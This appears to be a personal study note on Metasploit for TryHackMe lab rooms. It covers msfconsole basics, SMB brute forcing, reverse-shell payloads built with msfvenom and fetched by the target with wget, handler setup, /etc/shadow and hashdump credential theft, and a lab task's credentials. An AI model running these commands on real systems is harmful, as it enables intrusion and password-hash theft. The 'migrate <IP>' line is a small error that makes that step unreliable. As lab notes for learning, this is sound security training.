---
author: Alfeze
created: 2026-10-06
---
# Metasploit

> The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While its primary usage focuses on penetration testing, it is also useful for vulnerability research and exploit development. Metasploit payloads can be initially divided into two categories; inline (also called single) and staged.

---
##  msfconsole — Core Commands

Listing Meterpreter payloads : 
`msfvenom --list payloads | grep meterpreter`

### Variable handling

|Command|Scope / Purpose|Example|
|:--|:--|:--|
|`set <var> <val>`|Sets a variable for the current module only|`set RHOSTS 10.10.10.5`|
|`setg <var> <val>`|Sets a variable globally across all modules|`setg LHOST tun0`|
|`unset <var>`|Clears a local variable|`unset RHOSTS`|
|`unsetg <var>`|Clears a global variable|`unsetg RHOSTS`|
|`unset all`|Clears all variables in the active module|`unset all`|
|`exploit` / `run`|Executes the active module|`exploit`|
|`check`|Verifies target vulnerability without exploiting|`check`|
|`background`|Backgrounds current session (`Ctrl+Z`)|`background`|
|`sessions`|Lists all active sessions|`sessions`|
|`sessions -i <id>`|Interacts with a specific session|`sessions -i 1`|

### Set RHOSTS from a file

![[Pasted image 20261006113049.png]]

---

##  Exploit Ranking (the "rank" column)

Exploits are rated based on their reliability. The table below describes each rank.

![[Pasted image 20261006112041.png]]

Source: [Exploit Ranking | Metasploit Documentation](https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html)

---

##  The Metasploit Database

Initialize the database (once):

```text
root@attackbox:~# systemctl start postgresql
root@attackbox:~# sudo -u postgres msfdb init
Running the 'init' command for the database:
Creating database at /var/lib/postgresql/.msf4/db
...
Database initialization successful
root@attackbox:~#
```

Once `msfconsole` is running, check the status with:

```msf
msf > db_status
```

### Workspaces

```text
msf > workspace -h
Usage:
    workspace          List workspaces
    workspace [name]   Switch workspace

OPTIONS:
    -a, --add <name>          Add a workspace.
    -d, --delete <name>       Delete a workspace.
    -D, --delete-all          Delete all workspaces.
    -l, --list                List workspaces.
    -r, --rename <old> <new>  Rename a workspace.
    -S, --search <name>       Search for a workspace.
    -v, --list-verbose        List workspaces verbosely.
```

---

## Scanning

### Port scan

```msf
msf > search portscan
```

### SMB brute force login

```msf
use auxiliary/scanner/smb/smb_login

set SMBUser penny
set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
set STOP_ON_SUCCESS true
run
```

---

## msfvenom — Payload Generation

> `msfvenom` only **builds** the payload (the file), then exits. It does **not** start the handler. For _reverse_ payloads, you must run `exploit/multi/handler` separately, with the **same** PAYLOAD, LHOST and LPORT.

|Format|Command|
|:--|:--|
|Linux (ELF)|`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`|
|Windows (EXE)|`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`|
|PHP|`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`|
|ASP|`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`|
|Python|`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`|

### Transfer the payload to the target

On the attacking machine:

```bash
python3 -m http.server 9000
```

On the target:

```bash
wget http://ATTACKING_MACHINE_IP:9000/rev_shell.elf
```

---

## Handler (multi/handler)

Start it **before** running the payload on the target. The options must be **identical** to the ones used in `msfvenom`.

```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.10.2
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

> ⚠️ If the handler's PAYLOAD does not match the `.elf`, the session opens then closes immediately (`session closed`). This is **not** a network refusal — it's a **payload mismatch**.

---

## Meterpreter

> Meterpreter is a Metasploit payload that runs on the target and acts as an agent within a command-and-control architecture. You interact with the target OS, its files, and use Meterpreter's specialized commands.

Typing `help` on any Meterpreter session (shown by `meterpreter>` at the prompt) will list all available commands.

Useful commands: `sysinfo`, `getuid`, `ps`, `shell`, `background`, `hashdump` (requires `load priv`, mostly Windows).

Meterpreter runs in memory : . It runs in memory and does not write itself to the disk on the target. This feature aims to avoid being detected during antivirus scans.

## Post-Exploitation — ELF → session → hashdump (Linux)

1. **Run the payload on the target:**
    
    ```bash
    chmod +x rev_shell.elf
    ./rev_shell.elf
    ```
    
2. **Catch the session** in the handler → `meterpreter >` prompt.
    
3. **Dump hashes with the post-exploitation module:**
    
    ```msf
    background
    use post/linux/gather/hashdump
    set SESSION 1
    run
    ```
    

> ⚠️ The module needs `/etc/shadow` to be **readable** → you must be **root** in the session. As a normal user (e.g. `murphy`), the module fails with: `Post aborted due to failure: no-access: Shadow file must be readable`

### Privilege escalation (if not root)

From `meterpreter >`:

```text
shell
python3 -c 'import pty;pty.spawn("/bin/bash")'   # stabilize the shell
sudo -l                                          # check sudo rights
sudo -i                                          # or sudo su (if password known)
```

Once root, either re-run the module or read the file directly:

```bash
cat /etc/shadow
```

Real user lines (format `user:$6$...`) contain the hashes you're after.



--- 

## THM CHALL Meterpreter TASK 5

Username: ballen

Password: Password1

```msfconsole
exploit/windows/smb/psexec
```

```meterpreter
getuid
sysinfo
migrate <IP>
hashdump
search -f file.txt
cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
```

---
